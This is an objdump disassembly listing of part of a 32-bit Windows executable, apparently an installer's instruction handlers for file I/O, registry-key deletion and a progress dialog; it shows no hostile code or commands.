  4024fb:	ff 15 28 71 40 00    	call   *0x407128
  402501:	e9 a0 f0 ff ff       	jmp    0x4015a6
  402506:	6a 02                	push   $0x2
  402508:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  40250b:	e8 c9 04 00 00       	call   0x4029d9
  402510:	83 f8 01             	cmp    $0x1,%eax
  402513:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402516:	0f 8c 6f 03 00 00    	jl     0x40288b
  40251c:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  402521:	3b c1                	cmp    %ecx,%eax
  402523:	7e 03                	jle    0x402528
  402525:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  402528:	38 1e                	cmp    %bl,(%esi)
  40252a:	0f 84 8e 00 00 00    	je     0x4025be
  402530:	56                   	push   %esi
  402531:	88 5d 0b             	mov    %bl,0xb(%ebp)
  402534:	e8 4a 34 00 00       	call   0x405983
  402539:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
  40253c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40253f:	7e 7d                	jle    0x4025be
  402541:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  402544:	8d 45 d0             	lea    -0x30(%ebp),%eax
  402547:	53                   	push   %ebx
  402548:	50                   	push   %eax
  402549:	8d 45 f7             	lea    -0x9(%ebp),%eax
  40254c:	6a 01                	push   $0x1
  40254e:	50                   	push   %eax
  40254f:	ff 75 f8             	push   -0x8(%ebp)
  402552:	ff 15 2c 71 40 00    	call   *0x40712c
  402558:	85 c0                	test   %eax,%eax
  40255a:	74 65                	je     0x4025c1
  40255c:	83 7d d0 01          	cmpl   $0x1,-0x30(%ebp)
  402560:	75 5f                	jne    0x4025c1
  402562:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402565:	75 21                	jne    0x402588
  402567:	80 7d 0b 0d          	cmpb   $0xd,0xb(%ebp)
  40256b:	74 2b                	je     0x402598
  40256d:	80 7d 0b 0a          	cmpb   $0xa,0xb(%ebp)
  402571:	74 25                	je     0x402598
  402573:	8a 45 f7             	mov    -0x9(%ebp),%al
  402576:	88 04 3e             	mov    %al,(%esi,%edi,1)
  402579:	46                   	inc    %esi
  40257a:	3a c3                	cmp    %bl,%al
  40257c:	88 45 0b             	mov    %al,0xb(%ebp)
  40257f:	74 40                	je     0x4025c1
  402581:	3b 75 cc             	cmp    -0x34(%ebp),%esi
  402584:	7c be                	jl     0x402544
  402586:	eb 39                	jmp    0x4025c1
  402588:	0f b6 45 f7          	movzbl -0x9(%ebp),%eax
  40258c:	50                   	push   %eax
  40258d:	57                   	push   %edi
  40258e:	e8 d7 33 00 00       	call   0x40596a
  402593:	e9 fc 02 00 00       	jmp    0x402894
  402598:	8a 45 f7             	mov    -0x9(%ebp),%al
  40259b:	38 45 0b             	cmp    %al,0xb(%ebp)
  40259e:	74 0e                	je     0x4025ae
  4025a0:	3c 0d                	cmp    $0xd,%al
  4025a2:	74 04                	je     0x4025a8
  4025a4:	3c 0a                	cmp    $0xa,%al
  4025a6:	75 06                	jne    0x4025ae
  4025a8:	88 04 3e             	mov    %al,(%esi,%edi,1)
  4025ab:	46                   	inc    %esi
  4025ac:	eb 13                	jmp    0x4025c1
  4025ae:	6a 01                	push   $0x1
  4025b0:	53                   	push   %ebx
  4025b1:	6a ff                	push   $0xffffffff
  4025b3:	ff 75 f8             	push   -0x8(%ebp)
  4025b6:	ff 15 34 71 40 00    	call   *0x407134
  4025bc:	eb 03                	jmp    0x4025c1
  4025be:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  4025c1:	88 1c 3e             	mov    %bl,(%esi,%edi,1)
  4025c4:	3b f3                	cmp    %ebx,%esi
  4025c6:	e9 dd ef ff ff       	jmp    0x4015a8
  4025cb:	38 1e                	cmp    %bl,(%esi)
  4025cd:	0f 84 b8 02 00 00    	je     0x40288b
  4025d3:	ff 75 e8             	push   -0x18(%ebp)
  4025d6:	53                   	push   %ebx
  4025d7:	6a 02                	push   $0x2
  4025d9:	e8 fb 03 00 00       	call   0x4029d9
  4025de:	50                   	push   %eax
  4025df:	56                   	push   %esi
  4025e0:	e8 9e 33 00 00       	call   0x405983
  4025e5:	50                   	push   %eax
  4025e6:	ff 15 34 71 40 00    	call   *0x407134
  4025ec:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025ef:	0f 8c 96 02 00 00    	jl     0x40288b
  4025f5:	e9 37 02 00 00       	jmp    0x402831
  4025fa:	38 1e                	cmp    %bl,(%esi)
  4025fc:	0f 84 89 02 00 00    	je     0x40288b
  402602:	56                   	push   %esi
  402603:	e8 7b 33 00 00       	call   0x405983
  402608:	50                   	push   %eax
  402609:	ff 15 38 71 40 00    	call   *0x407138
  40260f:	e9 77 02 00 00       	jmp    0x40288b
  402614:	38 1f                	cmp    %bl,(%edi)
  402616:	74 18                	je     0x402630
  402618:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  40261e:	50                   	push   %eax
  40261f:	57                   	push   %edi
  402620:	e8 5e 33 00 00       	call   0x405983
  402625:	50                   	push   %eax
  402626:	ff 15 3c 71 40 00    	call   *0x40713c
  40262c:	85 c0                	test   %eax,%eax
  40262e:	75 3f                	jne    0x40266f
  402630:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402637:	88 1e                	mov    %bl,(%esi)
  402639:	e9 4d 02 00 00       	jmp    0x40288b
  40263e:	6a 02                	push   $0x2
  402640:	e8 b1 03 00 00       	call   0x4029f6
  402645:	8d 8d 5c fe ff ff    	lea    -0x1a4(%ebp),%ecx
  40264b:	51                   	push   %ecx
  40264c:	50                   	push   %eax
  40264d:	ff 15 40 71 40 00    	call   *0x407140
  402653:	83 f8 ff             	cmp    $0xffffffff,%eax
  402656:	75 10                	jne    0x402668
  402658:	88 1f                	mov    %bl,(%edi)
  40265a:	88 1e                	mov    %bl,(%esi)
  40265c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402663:	e9 23 02 00 00       	jmp    0x40288b
  402668:	50                   	push   %eax
  402669:	57                   	push   %edi
  40266a:	e8 fb 32 00 00       	call   0x40596a
  40266f:	8d 85 88 fe ff ff    	lea    -0x178(%ebp),%eax
  402675:	50                   	push   %eax
  402676:	56                   	push   %esi
  402677:	e9 35 01 00 00       	jmp    0x4027b1
  40267c:	6a f0                	push   $0xfffffff0
  40267e:	c7 45 f8 66 fd ff ff 	movl   $0xfffffd66,-0x8(%ebp)
  402685:	e8 6c 03 00 00       	call   0x4029f6
  40268a:	8b f0                	mov    %eax,%esi
  40268c:	56                   	push   %esi
  40268d:	89 75 bc             	mov    %esi,-0x44(%ebp)
  402690:	e8 d7 2e 00 00       	call   0x40556c
  402695:	85 c0                	test   %eax,%eax
  402697:	75 07                	jne    0x4026a0
  402699:	6a ed                	push   $0xffffffed
  40269b:	e8 56 03 00 00       	call   0x4029f6
  4026a0:	56                   	push   %esi
  4026a1:	e8 1e 30 00 00       	call   0x4056c4
  4026a6:	6a 02                	push   $0x2
  4026a8:	68 00 00 00 40       	push   $0x40000000
  4026ad:	56                   	push   %esi
  4026ae:	e8 30 30 00 00       	call   0x4056e3
  4026b3:	83 f8 ff             	cmp    $0xffffffff,%eax
  4026b6:	89 45 08             	mov    %eax,0x8(%ebp)
  4026b9:	0f 84 9d 00 00 00    	je     0x40275c
  4026bf:	a1 74 eb 42 00       	mov    0x42eb74,%eax
  4026c4:	8b 35 00 71 40 00    	mov    0x407100,%esi
  4026ca:	50                   	push   %eax
  4026cb:	6a 40                	push   $0x40
  4026cd:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4026d0:	ff d6                	call   *%esi
  4026d2:	8b f8                	mov    %eax,%edi
  4026d4:	3b fb                	cmp    %ebx,%edi
  4026d6:	74 7b                	je     0x402753
  4026d8:	53                   	push   %ebx
  4026d9:	e8 d1 09 00 00       	call   0x4030af
  4026de:	ff 75 d4             	push   -0x2c(%ebp)
  4026e1:	57                   	push   %edi
  4026e2:	e8 96 09 00 00       	call   0x40307d
  4026e7:	ff 75 e4             	push   -0x1c(%ebp)
  4026ea:	6a 40                	push   $0x40
  4026ec:	ff d6                	call   *%esi
  4026ee:	8b f0                	mov    %eax,%esi
  4026f0:	3b f3                	cmp    %ebx,%esi
  4026f2:	89 75 d0             	mov    %esi,-0x30(%ebp)
  4026f5:	74 34                	je     0x40272b
  4026f7:	ff 75 e4             	push   -0x1c(%ebp)
  4026fa:	56                   	push   %esi
  4026fb:	53                   	push   %ebx
  4026fc:	ff 75 e0             	push   -0x20(%ebp)
  4026ff:	e8 57 07 00 00       	call   0x402e5b
  402704:	eb 18                	jmp    0x40271e
  402706:	8b 0e                	mov    (%esi),%ecx
  402708:	8b 46 04             	mov    0x4(%esi),%eax
  40270b:	83 c6 08             	add    $0x8,%esi
  40270e:	51                   	push   %ecx
  40270f:	03 c7                	add    %edi,%eax
  402711:	56                   	push   %esi
  402712:	50                   	push   %eax
  402713:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  402716:	e8 89 2f 00 00       	call   0x4056a4
  40271b:	03 75 c8             	add    -0x38(%ebp),%esi
  40271e:	38 1e                	cmp    %bl,(%esi)
  402720:	75 e4                	jne    0x402706
  402722:	ff 75 d0             	push   -0x30(%ebp)
  402725:	ff 15 fc 70 40 00    	call   *0x4070fc
  40272b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40272e:	53                   	push   %ebx
  40272f:	50                   	push   %eax
  402730:	ff 75 d4             	push   -0x2c(%ebp)
  402733:	57                   	push   %edi
  402734:	ff 75 08             	push   0x8(%ebp)
  402737:	ff 15 28 71 40 00    	call   *0x407128
  40273d:	57                   	push   %edi
  40273e:	ff 15 fc 70 40 00    	call   *0x4070fc
  402744:	53                   	push   %ebx
  402745:	53                   	push   %ebx
  402746:	ff 75 08             	push   0x8(%ebp)
  402749:	6a ff                	push   $0xffffffff
  40274b:	e8 0b 07 00 00       	call   0x402e5b
  402750:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402753:	ff 75 08             	push   0x8(%ebp)
  402756:	ff 15 ec 70 40 00    	call   *0x4070ec
  40275c:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40275f:	6a f3                	push   $0xfffffff3
  402761:	5e                   	pop    %esi
  402762:	7d 13                	jge    0x402777
  402764:	6a ef                	push   $0xffffffef
  402766:	5e                   	pop    %esi
  402767:	ff 75 bc             	push   -0x44(%ebp)
  40276a:	ff 15 44 71 40 00    	call   *0x407144
  402770:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402777:	56                   	push   %esi
  402778:	e9 e7 f9 ff ff       	jmp    0x402164
  40277d:	53                   	push   %ebx
  40277e:	e8 56 02 00 00       	call   0x4029d9
  402783:	3b 05 8c eb 42 00    	cmp    0x42eb8c,%eax
  402789:	89 45 08             	mov    %eax,0x8(%ebp)
  40278c:	0f 83 ca fe ff ff    	jae    0x40265c
  402792:	8b f0                	mov    %eax,%esi
  402794:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402797:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  40279d:	03 35 88 eb 42 00    	add    0x42eb88,%esi
  4027a3:	3b c3                	cmp    %ebx,%eax
  4027a5:	7c 17                	jl     0x4027be
  4027a7:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  4027aa:	75 0f                	jne    0x4027bb
  4027ac:	83 c6 18             	add    $0x18,%esi
  4027af:	56                   	push   %esi
  4027b0:	57                   	push   %edi
  4027b1:	e8 56 32 00 00       	call   0x405a0c
  4027b6:	e9 d0 00 00 00       	jmp    0x40288b
  4027bb:	51                   	push   %ecx
  4027bc:	eb 74                	jmp    0x402832
  4027be:	83 c9 ff             	or     $0xffffffff,%ecx
  4027c1:	2b c8                	sub    %eax,%ecx
  4027c3:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4027c6:	74 0c                	je     0x4027d4
  4027c8:	6a 01                	push   $0x1
  4027ca:	e8 0a 02 00 00       	call   0x4029d9
  4027cf:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4027d2:	eb 10                	jmp    0x4027e4
  4027d4:	ff 75 ec             	push   -0x14(%ebp)
  4027d7:	8d 46 18             	lea    0x18(%esi),%eax
  4027da:	50                   	push   %eax
  4027db:	e8 4e 32 00 00       	call   0x405a2e
  4027e0:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  4027e4:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4027e7:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4027ea:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  4027ed:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4027f0:	0f 84 95 00 00 00    	je     0x40288b
  4027f6:	ff 75 08             	push   0x8(%ebp)
  4027f9:	e8 7f e9 ff ff       	call   0x40117d
  4027fe:	e9 88 00 00 00       	jmp    0x40288b
  402803:	53                   	push   %ebx
  402804:	e8 d0 01 00 00       	call   0x4029d9
  402809:	83 f8 20             	cmp    $0x20,%eax
  40280c:	0f 83 4a fe ff ff    	jae    0x40265c
  402812:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402815:	74 23                	je     0x40283a
  402817:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40281a:	74 0f                	je     0x40282b
  40281c:	50                   	push   %eax
  40281d:	e8 77 ea ff ff       	call   0x401299
  402822:	53                   	push   %ebx
  402823:	53                   	push   %ebx
  402824:	e8 c6 e9 ff ff       	call   0x4011ef
  402829:	eb 60                	jmp    0x40288b
  40282b:	53                   	push   %ebx
  40282c:	e8 b1 ea ff ff       	call   0x4012e2
  402831:	50                   	push   %eax
  402832:	57                   	push   %edi
  402833:	e8 32 31 00 00       	call   0x40596a
  402838:	eb 51                	jmp    0x40288b
  40283a:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40283d:	74 12                	je     0x402851
  40283f:	8b 15 70 eb 42 00    	mov    0x42eb70,%edx
  402845:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402848:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  40284f:	eb 3a                	jmp    0x40288b
  402851:	8b 0d 70 eb 42 00    	mov    0x42eb70,%ecx
  402857:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  40285e:	57                   	push   %edi
  40285f:	e8 ca 31 00 00       	call   0x405a2e
  402864:	eb 25                	jmp    0x40288b
  402866:	8b 0d e0 af 42 00    	mov    0x42afe0,%ecx
  40286c:	53                   	push   %ebx
  40286d:	23 c8                	and    %eax,%ecx
  40286f:	51                   	push   %ecx
  402870:	6a 0b                	push   $0xb
  402872:	ff 75 cc             	push   -0x34(%ebp)
  402875:	ff 15 44 72 40 00    	call   *0x407244
  40287b:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  40287e:	74 0b                	je     0x40288b
  402880:	53                   	push   %ebx
  402881:	53                   	push   %ebx
  402882:	ff 75 cc             	push   -0x34(%ebp)
  402885:	ff 15 40 72 40 00    	call   *0x407240
  40288b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40288e:	01 05 e8 eb 42 00    	add    %eax,0x42ebe8
  402894:	33 c0                	xor    %eax,%eax
  402896:	5f                   	pop    %edi
  402897:	5e                   	pop    %esi
  402898:	5b                   	pop    %ebx
  402899:	c9                   	leave
  40289a:	c2 04 00             	ret    $0x4
  40289d:	96                   	xchg   %eax,%esi
  40289e:	28 40 00             	sub    %al,0x0(%eax)
  4028a1:	90                   	nop
  4028a2:	14 40                	adc    $0x40,%al
  4028a4:	00 9c 14 40 00 b7 14 	add    %bl,0x14b70040(%esp,%edx,1)
  4028ab:	40                   	inc    %eax
  4028ac:	00 ca                	add    %cl,%dl
  4028ae:	14 40                	adc    $0x40,%al
  4028b0:	00 d6                	add    %dl,%dh
  4028b2:	14 40                	adc    $0x40,%al
  4028b4:	00 f0                	add    %dh,%al
  4028b6:	14 40                	adc    $0x40,%al
  4028b8:	00 67 15             	add    %ah,0x15(%edi)
  4028bb:	40                   	inc    %eax
  4028bc:	00 95 15 40 00 b3    	add    %dl,-0x4cffbfeb(%ebp)
  4028c2:	15 40 00 34 16       	adc    $0x16340040,%eax
  4028c7:	40                   	inc    %eax
  4028c8:	00 fe                	add    %bh,%dh
  4028ca:	14 40                	adc    $0x40,%al
  4028cc:	00 39                	add    %bh,(%ecx)
  4028ce:	15 40 00 5a 15       	adc    $0x155a0040,%eax
  4028d3:	40                   	inc    %eax
  4028d4:	00 45 16             	add    %al,0x16(%ebp)
  4028d7:	40                   	inc    %eax
  4028d8:	00 96 16 40 00 fa    	add    %dl,-0x5ffbfea(%esi)
  4028de:	16                   	push   %ss
  4028df:	40                   	inc    %eax
  4028e0:	00 21                	add    %ah,(%ecx)
  4028e2:	17                   	pop    %ss
  4028e3:	40                   	inc    %eax
  4028e4:	00 34 17             	add    %dh,(%edi,%edx,1)
  4028e7:	40                   	inc    %eax
  4028e8:	00 d8                	add    %bl,%al
  4028ea:	18 40 00             	sbb    %al,0x0(%eax)
  4028ed:	db 18                	fistpl (%eax)
  4028ef:	40                   	inc    %eax
  4028f0:	00 0d 19 40 00 22    	add    %cl,0x22004019
  4028f6:	19 40 00             	sbb    %eax,0x0(%eax)
  4028f9:	34 19                	xor    $0x19,%al
  4028fb:	40                   	inc    %eax
  4028fc:	00 b5 19 40 00 e6    	add    %dh,-0x19ffbfe7(%ebp)
  402902:	19 40 00             	sbb    %eax,0x0(%eax)
  402905:	26 1a 40 00          	sbb    %es:0x0(%eax),%al
  402909:	58                   	pop    %eax
  40290a:	1a 40 00             	sbb    0x0(%eax),%al
  40290d:	e5 1a                	in     $0x1a,%eax
  40290f:	40                   	inc    %eax
  402910:	00 06                	add    %al,(%esi)
  402912:	1b 40 00             	sbb    0x0(%eax),%eax
  402915:	ad                   	lods   %ds:(%esi),%eax
  402916:	1b 40 00             	sbb    0x0(%eax),%eax
  402919:	ad                   	lods   %ds:(%esi),%eax
  40291a:	1b 40 00             	sbb    0x0(%eax),%eax
  40291d:	6d                   	insl   (%dx),%es:(%edi)
  40291e:	1c 40                	sbb    $0x40,%al
  402920:	00 8a 1c 40 00 a5    	add    %cl,-0x5affbfe4(%edx)
  402926:	1c 40                	sbb    $0x40,%al
  402928:	00 c1                	add    %al,%cl
  40292a:	1c 40                	sbb    $0x40,%al
  40292c:	00 1b                	add    %bl,(%ebx)
  40292e:	1d 40 00 95 1d       	sbb    $0x1d950040,%eax
  402933:	40                   	inc    %eax
  402934:	00 c1                	add    %al,%cl
  402936:	1d 40 00 1b 1e       	sbb    $0x1e1b0040,%eax
  40293b:	40                   	inc    %eax
  40293c:	00 95 1e 40 00 c5    	add    %dl,-0x3affbfe2(%ebp)
  402942:	1e                   	push   %ds
  402943:	40                   	inc    %eax
  402944:	00 50 1f             	add    %dl,0x1f(%eax)
  402947:	40                   	inc    %eax
  402948:	00 20                	add    %ah,(%eax)
  40294a:	20 40 00             	and    %al,0x0(%eax)
  40294d:	72 21                	jb     0x402970
  40294f:	40                   	inc    %eax
  402950:	00 f4                	add    %dh,%ah
  402952:	21 40 00             	and    %eax,0x0(%eax)
  402955:	23 22                	and    (%edx),%esp
  402957:	40                   	inc    %eax
  402958:	00 67 22             	add    %ah,0x22(%edi)
  40295b:	40                   	inc    %eax
  40295c:	00 a7 22 40 00 03    	add    %ah,0x3004022(%edi)
  402962:	23 40 00             	and    0x0(%eax),%eax
  402965:	af                   	scas   %es:(%edi),%eax
  402966:	23 40 00             	and    0x0(%eax),%eax
  402969:	27                   	daa
  40296a:	24 40                	and    $0x40,%al
  40296c:	00 88 24 40 00 9c    	add    %cl,-0x63ffbfdc(%eax)
  402972:	24 40                	and    $0x40,%al
  402974:	00 be 24 40 00 06    	add    %bh,0x6004024(%esi)
  40297a:	25 40 00 cb 25       	and    $0x25cb0040,%eax
  40297f:	40                   	inc    %eax
  402980:	00 fa                	add    %bh,%dl
  402982:	25 40 00 14 26       	and    $0x26140040,%eax
  402987:	40                   	inc    %eax
  402988:	00 3e                	add    %bh,(%esi)
  40298a:	26 40                	es inc %eax
  40298c:	00 7c 26 40          	add    %bh,0x40(%esi,%eiz,1)
  402990:	00 7d 27             	add    %bh,0x27(%ebp)
  402993:	40                   	inc    %eax
  402994:	00 03                	add    %al,(%ebx)
  402996:	28 40 00             	sub    %al,0x0(%eax)
  402999:	8b 28                	mov    (%eax),%ebp
  40299b:	40                   	inc    %eax
  40299c:	00 8b 28 40 00 66    	add    %cl,0x66004028(%ebx)
  4029a2:	28 40 00             	sub    %al,0x0(%eax)
  4029a5:	79 1a                	jns    0x4029c1
  4029a7:	40                   	inc    %eax
  4029a8:	00 7d 1a             	add    %bh,0x1a(%ebp)
  4029ab:	40                   	inc    %eax
  4029ac:	00 81 1a 40 00 88    	add    %al,-0x77ffbfe6(%ecx)
  4029b2:	1a 40 00             	sbb    0x0(%eax),%al
  4029b5:	95                   	xchg   %eax,%ebp
  4029b6:	1a 40 00             	sbb    0x0(%eax),%al
  4029b9:	99                   	cltd
  4029ba:	1a 40 00             	sbb    0x0(%eax),%al
  4029bd:	9d                   	popf
  4029be:	1a 40 00             	sbb    0x0(%eax),%al
  4029c1:	a1 1a 40 00 aa       	mov    0xaa00401a,%eax
  4029c6:	1a 40 00             	sbb    0x0(%eax),%al
  4029c9:	b4 1a                	mov    $0x1a,%ah
  4029cb:	40                   	inc    %eax
  4029cc:	00 c1                	add    %al,%cl
  4029ce:	1a 40 00             	sbb    0x0(%eax),%al
  4029d1:	d9 1a                	fstps  (%edx)
  4029d3:	40                   	inc    %eax
  4029d4:	00 dd                	add    %bl,%ch
  4029d6:	1a 40 00             	sbb    0x0(%eax),%al
  4029d9:	8b 44 24 04          	mov    0x4(%esp),%eax
  4029dd:	8b 0d 78 9b 40 00    	mov    0x409b78,%ecx
  4029e3:	ff 34 81             	push   (%ecx,%eax,4)
  4029e6:	6a 00                	push   $0x0
  4029e8:	e8 41 30 00 00       	call   0x405a2e
  4029ed:	50                   	push   %eax
  4029ee:	e8 90 2f 00 00       	call   0x405983
  4029f3:	c2 04 00             	ret    $0x4
  4029f6:	56                   	push   %esi
  4029f7:	8b 74 24 08          	mov    0x8(%esp),%esi
  4029fb:	85 f6                	test   %esi,%esi
  4029fd:	57                   	push   %edi
  4029fe:	8b c6                	mov    %esi,%eax
  402a00:	7d 02                	jge    0x402a04
  402a02:	f7 d8                	neg    %eax
  402a04:	8b 15 78 9b 40 00    	mov    0x409b78,%edx
  402a0a:	8b c8                	mov    %eax,%ecx
  402a0c:	83 e1 0f             	and    $0xf,%ecx
  402a0f:	c1 f8 04             	sar    $0x4,%eax
  402a12:	ff 34 8a             	push   (%edx,%ecx,4)
  402a15:	c1 e0 0a             	shl    $0xa,%eax
  402a18:	05 80 9b 40 00       	add    $0x409b80,%eax
  402a1d:	50                   	push   %eax
  402a1e:	e8 0b 30 00 00       	call   0x405a2e
  402a23:	85 f6                	test   %esi,%esi
  402a25:	8b f8                	mov    %eax,%edi
  402a27:	7d 06                	jge    0x402a2f
  402a29:	57                   	push   %edi
  402a2a:	e8 3f 32 00 00       	call   0x405c6e
  402a2f:	8b c7                	mov    %edi,%eax
  402a31:	5f                   	pop    %edi
  402a32:	5e                   	pop    %esi
  402a33:	c2 04 00             	ret    $0x4
  402a36:	55                   	push   %ebp
  402a37:	8b ec                	mov    %esp,%ebp
  402a39:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  402a3f:	53                   	push   %ebx
  402a40:	56                   	push   %esi
  402a41:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402a44:	57                   	push   %edi
  402a45:	50                   	push   %eax
  402a46:	a1 10 ec 42 00       	mov    0x42ec10,%eax
  402a4b:	0c 08                	or     $0x8,%al
  402a4d:	33 db                	xor    %ebx,%ebx
  402a4f:	50                   	push   %eax
  402a50:	53                   	push   %ebx
  402a51:	ff 75 0c             	push   0xc(%ebp)
  402a54:	ff 75 08             	push   0x8(%ebp)
  402a57:	ff 15 10 70 40 00    	call   *0x407010
  402a5d:	3b c3                	cmp    %ebx,%eax
  402a5f:	75 69                	jne    0x402aca
  402a61:	8b 35 08 70 40 00    	mov    0x407008,%esi
  402a67:	bf 05 01 00 00       	mov    $0x105,%edi
  402a6c:	eb 19                	jmp    0x402a87
  402a6e:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  402a71:	75 4b                	jne    0x402abe
  402a73:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402a79:	53                   	push   %ebx
  402a7a:	50                   	push   %eax
  402a7b:	ff 75 fc             	push   -0x4(%ebp)
  402a7e:	e8 b3 ff ff ff       	call   0x402a36
  402a83:	85 c0                	test   %eax,%eax
  402a85:	75 12                	jne    0x402a99
  402a87:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402a8d:	57                   	push   %edi
  402a8e:	50                   	push   %eax
  402a8f:	53                   	push   %ebx
  402a90:	ff 75 fc             	push   -0x4(%ebp)
  402a93:	ff d6                	call   *%esi
  402a95:	85 c0                	test   %eax,%eax
  402a97:	74 d5                	je     0x402a6e
  402a99:	ff 75 fc             	push   -0x4(%ebp)
  402a9c:	ff 15 1c 70 40 00    	call   *0x40701c
  402aa2:	6a 02                	push   $0x2
  402aa4:	e8 85 32 00 00       	call   0x405d2e
  402aa9:	3b c3                	cmp    %ebx,%eax
  402aab:	74 24                	je     0x402ad1
  402aad:	53                   	push   %ebx
  402aae:	ff 35 10 ec 42 00    	push   0x42ec10
  402ab4:	ff 75 0c             	push   0xc(%ebp)
  402ab7:	ff 75 08             	push   0x8(%ebp)
  402aba:	ff d0                	call   *%eax
  402abc:	eb 0c                	jmp    0x402aca
  402abe:	ff 75 fc             	push   -0x4(%ebp)
  402ac1:	ff 15 1c 70 40 00    	call   *0x40701c
  402ac7:	33 c0                	xor    %eax,%eax
  402ac9:	40                   	inc    %eax
  402aca:	5f                   	pop    %edi
  402acb:	5e                   	pop    %esi
  402acc:	5b                   	pop    %ebx
  402acd:	c9                   	leave
  402ace:	c2 0c 00             	ret    $0xc
  402ad1:	39 1d 10 ec 42 00    	cmp    %ebx,0x42ec10
  402ad7:	75 ee                	jne    0x402ac7
  402ad9:	ff 75 0c             	push   0xc(%ebp)
  402adc:	ff 75 08             	push   0x8(%ebp)
  402adf:	ff 15 14 70 40 00    	call   *0x407014
  402ae5:	85 c0                	test   %eax,%eax
  402ae7:	75 de                	jne    0x402ac7
  402ae9:	eb df                	jmp    0x402aca
  402aeb:	8b 44 24 04          	mov    0x4(%esp),%eax
  402aef:	85 c0                	test   %eax,%eax
  402af1:	75 0a                	jne    0x402afd
  402af3:	a1 e4 eb 42 00       	mov    0x42ebe4,%eax
  402af8:	05 01 00 00 80       	add    $0x80000001,%eax
  402afd:	c2 04 00             	ret    $0x4
  402b00:	55                   	push   %ebp
  402b01:	8b ec                	mov    %esp,%ebp
  402b03:	8d 45 08             	lea    0x8(%ebp),%eax
  402b06:	50                   	push   %eax
  402b07:	a1 10 ec 42 00       	mov    0x42ec10,%eax
  402b0c:	0b 45 08             	or     0x8(%ebp),%eax
  402b0f:	50                   	push   %eax
  402b10:	6a 00                	push   $0x0
  402b12:	6a 22                	push   $0x22
  402b14:	e8 dd fe ff ff       	call   0x4029f6
  402b19:	50                   	push   %eax
  402b1a:	a1 78 9b 40 00       	mov    0x409b78,%eax
  402b1f:	ff 70 04             	push   0x4(%eax)
  402b22:	e8 c4 ff ff ff       	call   0x402aeb
  402b27:	50                   	push   %eax
  402b28:	ff 15 10 70 40 00    	call   *0x407010
  402b2e:	f7 d8                	neg    %eax
  402b30:	1b c0                	sbb    %eax,%eax
  402b32:	f7 d0                	not    %eax
  402b34:	23 45 08             	and    0x8(%ebp),%eax
  402b37:	5d                   	pop    %ebp
  402b38:	c2 04 00             	ret    $0x4
  402b3b:	55                   	push   %ebp
  402b3c:	8b ec                	mov    %esp,%ebp
  402b3e:	83 ec 40             	sub    $0x40,%esp
  402b41:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402b48:	75 19                	jne    0x402b63
  402b4a:	6a 00                	push   $0x0
  402b4c:	68 fa 00 00 00       	push   $0xfa
  402b51:	6a 01                	push   $0x1
  402b53:	ff 75 08             	push   0x8(%ebp)
  402b56:	ff 15 f0 71 40 00    	call   *0x4071f0
  402b5c:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402b63:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402b6a:	75 4c                	jne    0x402bb8
  402b6c:	8b 0d 80 4b 41 00    	mov    0x414b80,%ecx
  402b72:	a1 90 8b 42 00       	mov    0x428b90,%eax
  402b77:	3b c8                	cmp    %eax,%ecx
  402b79:	7c 02                	jl     0x402b7d
  402b7b:	8b c8                	mov    %eax,%ecx
  402b7d:	50                   	push   %eax
  402b7e:	6a 64                	push   $0x64
  402b80:	51                   	push   %ecx
  402b81:	ff 15 30 71 40 00    	call   *0x407130
  402b87:	50                   	push   %eax
  402b88:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402b8b:	68 18 90 40 00       	push   $0x409018
  402b90:	50                   	push   %eax
  402b91:	ff 15 00 72 40 00    	call   *0x407200
  402b97:	83 c4 0c             	add    $0xc,%esp
  402b9a:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402b9d:	50                   	push   %eax
  402b9e:	ff 75 08             	push   0x8(%ebp)
  402ba1:	ff 15 f4 71 40 00    	call   *0x4071f4
  402ba7:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402baa:	50                   	push   %eax
  402bab:	68 06 04 00 00       	push   $0x406
  402bb0:	ff 75 08             	push   0x8(%ebp)
